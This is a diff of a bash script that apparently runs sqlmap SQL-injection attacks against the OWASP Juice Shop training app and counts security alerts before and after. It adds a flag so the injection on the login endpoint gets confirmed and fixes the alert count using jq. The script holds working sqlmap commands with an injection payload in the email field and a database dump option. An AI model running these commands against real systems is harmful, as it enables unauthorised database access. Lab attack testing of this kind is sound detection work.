@@ -84,12 +84,16 @@ attack_login_blind() {
     local output_dir="$RESULTS_DIR/login_blind_$TIMESTAMP"
     mkdir -p "$output_dir"
 
+    # Juice Shop's login endpoint returns 401 for any failed credential guess —
+    # without --ignore-code 401, sqlmap treats every probe response as a
+    # generic failure and never confirms the injection (see P3-16 п.1).
     sqlmap -u "${JUICE_SH_URL}/rest/user/login" \
         --data="email=admin@juice-sh.op\"||\"\"==\"&password=test" \
         --method=POST \
         --level=3 \
         --risk=2 \
         --batch \
+        --ignore-code=401 \
         --technique=BEUSTQ \
         --dbms=SQLite \
         --dump \
@@ -173,6 +177,7 @@ attack_time_based() {
         --level=5 \
         --risk=3 \
         --batch \
+        --ignore-code=401 \
         --technique=T \
         --time-sec=5 \
         --dbms=SQLite \
@@ -260,9 +265,16 @@ analyze_results() {
     echo "========================================" >> "$summary_file"
     echo "" >> "$summary_file"
 
-    # Подсчет количества алертов
-    local alerts_before=$(wc -l < "$RESULTS_DIR/alerts-before-$TIMESTAMP.json")
-    local alerts_after=$(wc -l < "$RESULTS_DIR/alerts-after-$TIMESTAMP.json")
+    # Подсчет количества алертов. /api/v1/alerts отдаёт JSON-массив, обычно на
+    # одной строке — "wc -l" всегда давал 1/1/0 независимо от реального числа
+    # элементов. jq считает по массиву, что и требовалось (см. P2-7 п.4).
+    local alerts_before=0 alerts_after=0
+    if command -v jq &> /dev/null; then
+        alerts_before=$(jq 'length' "$RESULTS_DIR/alerts-before-$TIMESTAMP.json" 2>/dev/null || echo 0)
+        alerts_after=$(jq 'length' "$RESULTS_DIR/alerts-after-$TIMESTAMP.json" 2>/dev/null || echo 0)
+    else
+        warn "jq не найден — подсчёт алертов пропущен"
+    fi
     local new_alerts=$((alerts_after - alerts_before))
 
     echo "Алерты до атаки: $alerts_before" >> "$summary_file"
